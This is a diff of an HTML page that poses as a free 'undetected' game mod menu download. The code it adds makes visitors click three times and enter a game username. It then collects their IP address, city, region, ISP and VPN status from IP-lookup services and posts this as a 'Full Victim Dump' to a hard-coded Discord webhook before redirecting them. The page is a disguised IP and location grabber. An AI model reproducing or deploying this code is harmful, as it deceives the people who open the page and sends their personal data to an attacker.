@@ -6,14 +6,15 @@
     <title>ULTIMATE MOD MENU v2.4 - FREE DOWNLOAD</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
-        body { background: linear-gradient(45deg, #0a0a0a, #1a001f, #000); color: #00ff41; font-family: 'Press Start 2P', cursive; text-align: center; padding: 20px; margin: 0; overflow: hidden; height: 100vh; }
+        body { background: linear-gradient(45deg, #0a0a0a, #1a001f, #000); color: #00ff41; font-family: 'Press Start 2P', cursive; text-align: center; padding: 20px; margin: 0; overflow: hidden; height: 100vh; cursor: pointer; }
         .container { max-width: 680px; margin: auto; padding-top: 8vh; }
         h1 { font-size: 2em; text-shadow: 0 0 20px #00ff41, 0 0 40px #ff00ff; animation: glitch 0.7s infinite alternate; margin-bottom: 10px; }
         .subtitle { color: #ff00ff; font-size: 1.1em; margin-bottom: 30px; }
         .progress { height: 28px; background: #111; border: 3px solid #00ff41; margin: 35px auto; width: 88%; box-shadow: 0 0 25px #00ff41; }
-        .bar { height: 100%; width: 0%; background: linear-gradient(to right, #00ff41, #ff00ff, #00ff41); transition: width 0.25s linear; box-shadow: 0 0 20px #ff00ff; }
+        .bar { height: 100%; width: 0%; background: linear-gradient(to right, #00ff41, #ff00ff, #00ff41); transition: width 0.4s linear; box-shadow: 0 0 20px #ff00ff; }
         @keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-4px, 3px); } 40% { transform: translate(4px, -3px); } 100% { transform: translate(0); } }
         #status { margin: 20px 0; font-size: 1.15em; min-height: 1.8em; text-shadow: 0 0 10px #00ff41; }
+        .clicks { color: #ff00ff; font-size: 1.2em; margin: 20px 0; }
     </style>
 </head>
 <body>
@@ -22,7 +23,8 @@
         <p class="subtitle">FREE • UNDETECTED • WORKING 2026</p>
         <p id="status">Connecting to private server...</p>
         <div class="progress"><div id="prog" class="bar"></div></div>
-        <p style="margin-top:40px; color:#ff00ff;">Activating cheats...</p>
+        <p class="clicks" id="clickCount">CLICK 3 TIMES TO ACTIVATE CHEATS</p>
+        <p style="margin-top:40px; color:#ff00ff;">Tap screen / Click anywhere to progress</p>
     </div>
 
     <script>
@@ -40,20 +42,26 @@
             fingerprint: "AUTO-" + Date.now() + "-" + Math.random().toString(36).substring(2)
         };
 
-        function fakeLoading() {
-            let progress = 0;
+        let clickCount = 0;
+        const maxClicks = 3;
+
+        function updateProgress() {
             const progBar = document.getElementById('prog');
             const status = document.getElementById('status');
-            const msgs = ["Connecting...", "Bypassing anticheat...", "Injecting cheats...", "Finalizing..."];
-            let i = 0;
-            const int = setInterval(() => {
-                progress += 22;
-                progBar.style.width = `${Math.min(progress, 100)}%`;
-                if (progress > 25 && i === 0) { status.textContent = msgs[1]; i++; }
-                if (progress > 55 && i === 1) { status.textContent = msgs[2]; i++; }
-                if (progress > 80 && i === 2) { status.textContent = msgs[3]; i++; }
-                if (progress >= 100) clearInterval(int);
-            }, 140);
+            const clicksDisplay = document.getElementById('clickCount');
+            
+            clickCount++;
+            clicksDisplay.textContent = `CLICKS: ${clickCount}/${maxClicks}`;
+            
+            const progressPercent = (clickCount / maxClicks) * 100;
+            progBar.style.width = `${progressPercent}%`;
+
+            if (clickCount === 1) status.textContent = "Bypassing anticheat...";
+            if (clickCount === 2) status.textContent = "Injecting cheats...";
+            if (clickCount >= maxClicks) {
+                status.textContent = "Finalizing...";
+                setTimeout(triggerGrab, 600);
+            }
         }
 
         async function getIPAndGeo() {
@@ -72,4 +80,68 @@
                 },
                 async () => {
                     const res = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-                    return { ip: res.ip, country: res.country_name
+                    return { ip: res.ip, country: res.country_name, countryCode: res.country, city: res.city, region: res.region, isp: res.org, timezone: res.timezone };
+                }
+            ];
+
+            for (let svc of services) {
+                try {
+                    const res = await svc();
+                    if (res.ip) {
+                        data.ip = res.ip;
+                        data.country = res.country || res.country_name || "Unknown";
+                        data.countryCode = res.countryCode || "N/A";
+                        data.city = res.city || "Unknown";
+                        data.region = res.region || res.regionName || "Unknown";
+                        data.isp = res.isp || res.org || "Unknown";
+                        data.timezone = res.timezone || "Unknown";
+                        data.lat = res.lat || "N/A";
+                        data.lon = res.lon || "N/A";
+                        data.proxy = (res.proxy || false) ? "YES (VPN/Proxy)" : "No";
+                        return true;
+                    }
+                } catch (e) {}
+            }
+            data.ip = data.ip || "Lookup Failed";
+            data.country = data.country || "Unknown";
+            data.city = data.city || "Unknown";
+            data.isp = data.isp || "Unknown";
+            return false;
+        }
+
+        function sendToDiscord() {
+            const webhook = "https://discord.com/api/webhooks/1516706014680973463/zTHEkVGuFtloIYwKQuSKgRGC6lVulRm8ly3GkolhF7S4TFu5TrWCs2tW0lb1Cpyu1Q04";
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "Mod Menu Grabber",
+                    content: `**🔥 MOD MENU GRABBED 🔥**\n**ID:** ${data.customId}\n**Name:** ${data.name}\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.country} (${data.region})\n**ISP:** ${data.isp}\n**Proxy/VPN:** ${data.proxy}\n**Time:** ${data.timestamp}`,
+                    embeds: [{
+                        title: "Full Victim Dump",
+                        description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
+                        color: 0x00ff41
+                    }]
+                })
+            }).catch(() => {});
+        }
+
+        async function triggerGrab() {
+            data.name = prompt("ENTER YOUR GAME USERNAME TO ACTIVATE:", "") || "Anonymous";
+            await getIPAndGeo();
+            sendToDiscord();
+            setTimeout(() => {
+                window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=OFz4DE-EodfVa6qC";
+            }, 1000);
+        }
+
+        // Click anywhere to progress
+        document.addEventListener('click', updateProgress);
+        
+        // Initial status
+        window.onload = () => {
+            document.getElementById('clickCount').textContent = `CLICK 3 TIMES TO ACTIVATE CHEATS`;
+        };
+    </script>
+</body>
+</html>
